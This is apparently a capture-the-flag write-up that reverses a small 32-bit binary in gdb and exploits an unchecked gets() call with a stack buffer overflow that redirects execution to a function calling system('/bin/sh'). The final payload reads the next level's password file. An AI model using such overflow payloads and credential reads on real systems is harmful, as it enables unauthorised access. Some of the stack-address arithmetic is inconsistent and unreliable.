# Step 1 : ASM analysis

## Functions

```
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
...
```

`main()` and `run()` are the 2 functions we need to examine here.

## Function main (0x08048480)

```
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
```

Let's check what the function call `gets()` does.

From `man gets`

```
DESCRIPTION
       Never use this function.

       gets() reads a line from stdin into the buffer pointed to by s
       until either a terminating newline or EOF, which it replaces with
       a null byte ('\0').  No check for buffer overrun is performed
       (see BUGS below).
```

So this is what we need to exploit. We noticed that `main()` is not calling run.
We want to create a buffer overflow and change the value of the old `ebp` to the function `run()`'s address in order to run it.

```
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
```

We can get old `ebp` address on the stack at `[esp + 0x4]` (since `esp` is decremented after the push).

```
(gdb) x/2wx $esp
0xbffff728:	0x00000000	0xb7e454d3
```

Old `ebp` is store on the stack at the address `0xbffff72c`.

```
   0x08048486 <+6>:	sub    esp,0x50
```

`0x50` bytes are allocated on the stack for local variables.

```
(gdb) p $esp
$1 = (void *) 0xbffff720
```

New `esp` value is `0xbffff6d0`

```
   0x08048489 <+9>:	lea    eax,[esp+0x10]
```

This line says that the address of the pointer that wil be given as a parameter to the `gets()` function is `[esp + 0x10]` = `0xbffff730`

In order to calculate how many bytes we need to put in the buffer to reach old `ebp` address, we can substract it with the address of the buffer :

> 0xbffff72c - 0xbffff6d0 = 0x4c = 76

## Function run (0x08048444)

```
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
```

What's important in this one is that `system()` is called with the argument `/bin/sh` so, once again, we will be able to use that to open a shell with the user that has the permission on the file.

However `system()` isn't working like `execv()` :

> The exec() function replace the currently running process image when successful, no child is created (unless you do that yourself previously with fork()). The system() function does fork a child process and returns when the command supplied is finished executing or an error occurs.
> [:link:](<https://stackoverflow.com/questions/1697440/difference-between-system-and-exec-in-linux#:~:text=system()%20will%20execute%20the,fork()%20your%20process%20beforehand.>)

# Step 2 : Resolution

## 1 - Buffer overflow

We must input a string of 76 bytes plus the function `run()` address (0x08048444).

A way to do so is to use python with the `-c` flag to execute some code in a command:

`python -c 'print "A" * 76 + "\x08\x04\x84\x44"' | ./level1`

It gives a segfault without printing "Good... Wait what?\n" which is supposed to happen if we get into the `run()` function.

When we have a closer look at the stack, we can see that the address is writen in little endian. (ref: http://myweb.usf.edu/~kevindennis/wcsc/bof.pdf)

`python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1`

This is more like it.

## 2 - Keeping the shell

Now we get into the `run()` function but we still can't access the shell.

We know that `system()` is opening a shell in an other process and will exit if the main parent process exit.

`(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; echo "cat /home/user/level2/.pass") | ./level1`

Here the `stdin` pipe will first send our malicious string to be read by the `gets()` function and then the same thing for the `cat` command but this time inside the new shell.
